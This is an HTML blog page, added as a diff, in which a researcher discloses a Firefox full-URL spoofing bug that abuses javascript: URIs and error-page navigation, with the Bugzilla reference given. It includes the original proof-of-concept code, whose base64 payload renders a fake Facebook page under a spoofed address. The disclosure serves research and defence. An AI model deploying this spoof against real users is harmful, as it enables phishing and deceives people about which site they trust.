@@ -1,0 +1,82 @@
+<!doctype html>
+<html>
+<head>
+	<title>FireFox Full URL spoof using javascript URI scheme - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/>
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+
+
+
+<div id="qWriteup">
+<h1>FireFox Full URL spoof using javascript URI scheme</h1>
+<br>
+
+<p>
+After finding the bug which results in hiding the address bar using the Javascript URI scheme described <a href="../FireFox-Hide-URL-(FIXED)/">here</a> I was able to stumble upon another bug which enabled full address bar spoofing!<br>
+The inspiration came from a comment on the bugzilla report made by Boris Zbarsky for the previous bug which resulted in hiding the address bar. He mentioned that some sort of mechanism was present
+which prevented javascript to be executed when hitting the back/forward button on the browser.<br><br>
+I believe there used to be an older bug which relied on the user to navigate from say <code>'http://trusted.ltd'</code> to <code>'javascript:alert(document.domain)'</code> it will not execute the javascript.<br>
+However, I managed to circumvent this fix to an older bug by having the user instead of going to a normal <code>'http://trusted.ltd'</code> website the user would instead go to an invalid one, we do this by inserting an invalid char at the end of the address.<br>
+<br>
+For example, going to <code>'http://facebook.com;'</code> (notice the semicolon) will result in a 'Server not found' error page, that looks like this:<br>
+<br>
+<img src="../qimg/Art4-sub1.png"/>
+<br><br>
+The downside of this type of bug is that I don't actually get any information from the spoofed domain, this is purely to trick the victim into assuming they are in a trusted domain.<br>
+Now if we go to an error page and navigate back to a <code>'javascript:'</code> URI scheme, the existing security measures that usually would prevent javacript execution are bypassed and we are able to 
+spoof any URL with a resulting error page.<br>
+The only time we could spoof a domain char per char without adding invalid char is if the domain does not implement a valid cert, or if the targeted domain does not have https capabilities but we have the user go to an https url.<br>
+
+
+<br>Here is the original proof of concept code reported to Mozilla.
+<h2>Original PoC code:</h2>
+<!-- HTML generated using hilite.me --><div class="qCode" style=" overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">&lt;html&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;title&gt;</span>FF-FULL-URL-Spoof - @qab<span style="color: #000080; font-weight: bold">&lt;/title&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;a</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&#39;q&#39;</span> <span style="color: #FF0000">href=</span><span style="color: #0000FF">&#39;https://qabandi.com&#39;</span><span style="color: #000080; font-weight: bold">&gt;</span>Click here then navigate back<span style="color: #000080; font-weight: bold">&lt;/a&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;script&gt;</span>
+<span style="color: #000080; font-weight: bold">var</span> payload=<span style="color: #0000FF">&#39;PGI+QHFhYjwvYj48aW1nIGlkPSdxYWInLz4KPHNjcmlwdD4KKGZ1bmN0aW9uKCkgey8vVGhpcyBpcyB0byBzZXQgdGhlIGZhdmljb24KICAgIHZhciBxID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbGluaycpOwogICAgcS50eXBlID0gJ2ltYWdlL3gtaWNvbic7CiAgICBxLnJlbCA9ICdzaG9ydGN1dCBpY29uJzsKICAgIHEuaHJlZiA9ICdodHRwczovL3d3dy5mYWNlYm9vay5jb20vZmF2aWNvbi5pY28nOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXS5hcHBlbmRDaGlsZChxKTsKfSgpKTsKCndpbmRvdy5kb2N1bWVudC50aXRsZT0naHR0cHM6Ly93d3cuZmFjZWJvb2suY29tJzt3aW5kb3cuc3RvcCgpOwpxYWIuc3JjPSdodHRwOi8vaS5pbWd1ci5jb20vbmFmMmpHWi5qcGcnOwo8L3NjcmlwdD4=&#39;</span>;
+q.addEventListener(<span style="color: #0000FF">&quot;click&quot;</span>,$=&gt;{q.href=<span style="color: #0000FF">&quot;javascript:try{q;&#39;&lt;script&gt;location.reload()&lt;\/script&gt;&#39;}catch(e){if(location.toString().contains(&#39;http&#39;)){document.write(atob(&#39;&quot;</span>+payload+<span style="color: #0000FF">&quot;&#39;));1;}else{location=&#39;https://qabandi.com&#39;;}}&quot;</span>;});<span style="color: #008800; font-style: italic">//We replace the href right before the user clicks it.</span>
+<span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/html&gt;</span>
+</pre></div>
+
+</p><br>
+
+
+
+<p>
+<h2>Further explanation:</h2>
+When Firefox shows you an error page and say you visited the previously mentioned <code>'http://facebook.com;'</code> (note the semicolon again), despite the URL address displaying the invalid link, you're not actually on that URL in the back end. (not as far as the documents concerned)<br>
+To test this you can check the value of <code>'document.documentURI'</code> which in this case equals<code>'about:neterror?e=dnsNotFound&u=http%3A//www.facebook.com%3B/&c=UTF-8&f=regular&d=Firefox%20can%27t%20find%20the%20server%20at%20www.facebook.com%3B.'</code>
+ I believe this is how it was possible to bypass the existing security, as the security measures only took into account http/s urls and not about: urls.
+<h2>References:</h2>
+<b>The Bugzilla report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1247968" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1247968</a>
+<br>
+
+</p>
+</div>
+
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
